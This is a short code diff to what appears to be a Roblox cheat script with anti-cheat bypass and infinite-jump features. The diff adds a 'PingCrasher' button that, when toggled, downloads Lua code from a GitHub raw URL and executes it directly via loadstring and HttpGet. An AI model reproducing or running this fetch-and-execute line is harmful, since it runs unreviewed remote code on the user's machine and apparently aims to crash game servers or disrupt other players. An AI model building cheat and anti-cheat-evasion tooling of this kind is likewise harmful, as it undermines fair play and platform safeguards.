@@ -135,6 +135,15 @@ local void = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOpt
 })
 
 
+local void = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
+    ["Name"] = "PingCrasher",
+    ["Function"] = function(v)
+        if v then
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/DrDweeb1/Dweebs/main/DweebDr", true))()
+        end
+    end
+})
+
 local AnticheatDisabler = COB("Blatant", {
     Name = "InfiniteJump",
     Function = function(callback) 
